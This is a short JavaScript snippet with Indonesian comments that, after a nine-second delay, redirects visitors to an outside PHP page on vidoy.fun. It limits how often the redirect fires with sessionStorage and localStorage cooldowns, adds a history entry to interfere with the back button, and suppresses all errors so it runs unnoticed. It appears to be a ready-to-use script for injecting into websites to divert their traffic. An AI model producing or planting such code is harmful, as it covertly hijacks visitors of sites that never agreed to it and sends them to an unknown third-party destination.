(function () {
  try {
    // === SETTING ===
    var target     = "https://vidoy.fun/cB6Tyq0.php"; // tujuan redirect (HTTPS)
    var cooldownMs = 15 * 1000;                       // jeda agar tidak redirect lagi (1 menit)
    var delayMs    = 9000;                            // DELAY sebelum redirect (ms) → ganti sesukamu
    // =================

    if (!/^https:\/\//i.test(target)) return;

    // Bypass manual: ?noredir=1 atau #noredir
    var qs = location.search + location.hash;
    if (/[?#](?:.*[&?])?noredir=1(?:&|$)/i.test(qs)) return;

    // Anti-loop: sekali per TAB + cooldown lintas tab/device
    var page = location.origin + location.pathname;   // abaikan query biar konsisten
    var sessKey = "redir_seen:" + page + "|" + target;
    var cdKey   = "redir_cd:"   + page + "|" + target;

    var now = Date.now();
    if (sessionStorage.getItem(sessKey)) return;
    var until = parseInt(localStorage.getItem(cdKey) || "0", 10);
    if (now < until) return;

    // Kunci dulu supaya reload/balik tidak retrigger
    sessionStorage.setItem(sessKey, "1");
    localStorage.setItem(cdKey, String(now + cooldownMs));

    // (Opsional) sedikit bantalan history
    try { history.pushState({ hold: 1 }, "", location.href); } catch (_) {}

    // === DELAY sebelum redirect ===
    setTimeout(function () {
      try { location.href = target; } catch(_) {}
      try { location.assign(target); } catch(_) {}
    }, delayMs);

    // Kalau benar-benar pindah (halaman jadi hidden), perpanjang cooldown sedikit
    var armed = true;
    function seenHidden() {
      if (!armed) return;
      if (document.visibilityState === "hidden") {
        armed = false;
        var extra = Math.max(cooldownMs, 30 * 1000); // minimal 30 detik
        localStorage.setItem(cdKey, String(Date.now() + extra));
      }
    }
    document.addEventListener("visibilitychange", seenHidden, true);
    window.addEventListener("pagehide", function(){ seenHidden(); }, {capture:true, passive:true});
  } catch (_) {}
})();
